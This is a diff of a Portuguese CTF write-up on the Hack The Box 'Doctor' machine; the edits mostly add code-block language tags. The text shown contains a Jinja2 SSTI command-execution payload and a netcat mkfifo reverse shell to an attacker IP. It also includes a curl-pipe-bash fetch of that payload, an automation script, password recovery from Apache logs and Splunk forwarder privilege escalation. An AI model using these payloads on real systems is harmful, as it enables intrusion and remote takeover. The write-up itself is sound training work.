@@ -21,7 +21,7 @@ Começando a postar sobre alguns write-ups de máquinas estilo CTF, a primeira a
 
 Então vamos começar com uma enumeração rápida utilizando o `nmap`. Executando um quick scan obtive o seguinte resultado, onde foi possível notar dois serviços HTTP, além de uma porta de SSH aberta:
 
-```
+```bash
 nmap -sC -sV -Pn -oA quick 10.10.10.209
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-14 19:46 -03
@@ -118,7 +118,7 @@ Acessando a mensagem postada na sequência, notei que é direcionado para a URL 
 
 Manipulando a url, consegui acessar outros posts, como por exemplo `http://doctors.htb/post/1` que se tratava de uma mensagem do usuário `admin` mas que não possuia nenhuma informação relevante.
 
-As coisas ficaram interessantes quando decidi acessar novamente o `/archive`, onde o conteúdo do título utilizado na mensagem criada foi exibido, o que levantou a possibilidade de obter um acesso inicial a partir da exploração via *Server-Side Template Injection (SSTI)*. 
+As coisas ficaram interessantes quando decidi acessar novamente o `/archive`, onde o conteúdo do título utilizado na mensagem criada foi exibido, o que levantou a possibilidade de obter um acesso inicial a partir da exploração via *Server-Side Template Injection (SSTI)*.
 
 Para confirmar a possibilidade, seguindo o que encontrei em [SSTI (Server Side Template Injection) - HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#identify), troquei o conteúdo do título da minha mensagem anterior para testar alguns tipos de injeção sugeridos, que nos permitirá identificar qual a engine utilizada e, posteriormente, criar o conteúdo malicioso para obter um acesso inicial.
 
@@ -128,11 +128,9 @@ Esta injeção funcionou com sucesso, indicando que temos um website construido 
 
 ![image-20210115111818436](https://i.imgur.com/EH0zQHN.png){: .align-center}
 
+Depois de alguns testes, brincando com exemplos disponíveis em [PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection), consegui confirmar que a engine utilizada é **Jinja2**, onde o conteúdo abaixo funcionou sem problemas, dentre outros:
 
-
-Depois de alguns testes, brincando com exemplos disponíveis em [PayloadsAllTheThings/Server Side Template Injection at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server Side Template Injection), consegui confirmar que a engine utilizada é **Jinja2**, onde o conteúdo abaixo funcionou sem problemas, dentre outros:
-
-```
+```python
 {% raw %}{{config.items()}}{% endraw %}
 ```
 
@@ -142,31 +140,31 @@ Após confirmado que um payload para Jinja2 deveria ser utilizado, foi possível
 
 - Em uma pasta na máquina do atacante, criei um arquivo de payload contendo a string que, uma vez executada, nos retornaria um shell reverso na porta 4443;
 
-  ```
+  ```bash
   rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4443 >/tmp/f
   ```
   
 - Este arquivo foi publicado a partir de um server HTTP simples utilizando python3, conforme execução do comando abaixo a partir do diretório onde o arquivo criado está localizado;
 
-  ```
+  ```bash
     sudo python3 -m http.server 80
   ```
   
 - No portal, criei um novo post inserindo no lugar da string `title`, o conteúdo obtido no link acima citado do PayloadsAllTheThings. Este especificamente é bem interessante, pois nos permite executar comandos de forma dinâmica a partir do conteúdo recebido da variável **input** em um request do tipo GET, evitando assim modificar frequentemente o conteúdo da injeção:
 
-  ```
+  ```python
   {% raw %}{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}{% endraw %}
   ```
   
 - Iniciei um listener usando netcat para ouvir na porta configurada no payload usando o comando abaixo;
 
-  ```
+  ```bash
   nc -lnvp 4443
   ```
 
 - E depois fiz um request no portal, passando o comando que gostaria de ser executado na query string com o comando no input que gostaria que fosse executado.
 
-  ```
+  ```bash
   http://doctors.htb/archive?input=curl%20-L%20http://10.10.10.10/payload%20|%20bash
   ```
 
@@ -204,7 +202,7 @@ r = s.post(url+'/login?next=%2Fhome',data=payload)
 
 # Create message
 {% raw %}
-title = "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__bu	iltins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}"
+title = "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}"
 {% endraw %}
 payload = {'title':title,'content':'content','submit':'Post'}
 r = s.post(url+'/post/new',data=payload)
@@ -213,9 +211,8 @@ r = s.post(url+'/post/new',data=payload)
 command = requests.utils.quote('curl -L http://'+ip+'/payload | bash')
 r = s.get(url+'/archive?input='+command)
 ```
-## User flag
 
-### Enumeração
+## User flag
 
 Depois de obter o shell reverso, [fiz o upgrade dele para ter acesso a funcionalidades de auto-complete, etc](https://blog.mrtnrdl.de/infosec/2019/05/23/obtain-a-full-interactive-shell-with-zsh.html), e iniciei o processo de enumeração:
 
@@ -223,12 +220,12 @@ Depois de obter o shell reverso, [fiz o upgrade dele para ter acesso a funcional
 
 - Verificando os grupos dos quais o usuário **web** é membro, notei que a conta é membro do grupo **adm**:
 
-  ```
+  ```bash
   web@doctor:/home$ id
   uid=1001(web) gid=1001(web) groups=1001(web),4(adm)
   ```
 
-  - O grupo **adm** no Linux permite acesso a arquivos localizados no diretório `/var/log`, que possivelmente pode permitir que consigamos alguma informação sensivel dentro das logs de componentes do sistema como webservers e tarefas agendadas (cron). 
+  - O grupo **adm** no Linux permite acesso a arquivos localizados no diretório `/var/log`, que possivelmente pode permitir que consigamos alguma informação sensivel dentro das logs de componentes do sistema como webservers e tarefas agendadas (cron).
 
 ### Analizando as logs em /var/log
 
@@ -285,7 +282,7 @@ total 7980
 
 Verificando seu conteúdo, buscando pelas query strings únicas logadas nos requests, encontramos uma entrada interessante que traz um valor que possivelmente poderia ser utilizado como senha: **Guitar123**
 
-```
+```bash
 web@doctor:/var/log/apache2$ awk -F" " '{print $7}' backup | sort | uniq
 /
 12.1.2\n"
@@ -310,7 +307,7 @@ web@doctor:/var/log/apache2$ awk -F" " '{print $7}' backup | sort | uniq
 
 Como o outro usuário desta máquina é o **shaun**, tentando utilizar o usuário e senha que temos até o momento, tive sucesso ao logar com a conta mencionada, o que permitiu obter a flag contida em `/home/shaun/user.txt`:
 
-```
+```bash
 web@doctor:~$ su shaun
 Password:
 
@@ -334,11 +331,9 @@ shaun@doctor:~$ cat user.txt
 
 ## Root flag
 
-### Enumeração
-
 Agora logado como shaun, notei que ele não possui nenhum privilégio especial na maquina, além de não ter direitos de executar quaisquer comandos como root a partir do `sudo`:
 
-```
+```bash
 shaun@doctor:/tmp$ sudo -l
 [sudo] password for shaun: 
 Sorry, user shaun may not run sudo on d
@@ -350,11 +345,7 @@ Acessando este serviço manualmente, ao clicar no link **services**, conforme li
 
 ![image-20210131080459535](https://i.imgur.com/R4VNKDe.png){: .align-center}
 
-
-
 ![image-20210131080540525](https://i.imgur.com/lsTJ2cg.png){: .align-center}
-
-
 
 Uma vez que temos credenciais para logon no serviço do Splunk, o próximo passo é encontrar uma forma de obter execução remota de código através do mesmo. Após alguma pesquisa, encontrei este link [Abusing Splunk Forwarders For Shells and Persistence · Eapolsniper's Blog](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) que menciona um script disponível em [GitHub - cnotin/SplunkWhisperer2: Local privilege escalation, or remote code execution, through Splunk Universal Forwarder (UF) misconfigurations](https://github.com/cnotin/SplunkWhisperer2), que permitirá exatamente o que estávamos procurando.
 
@@ -382,7 +373,7 @@ Bye!
 
 A partir deste shell, a obtenção da flag em `/root/root.txt` pode ocorrer sem problemas.
 
-```
+```bash
 # cat /root/root.txt
 <redacted>
 ```
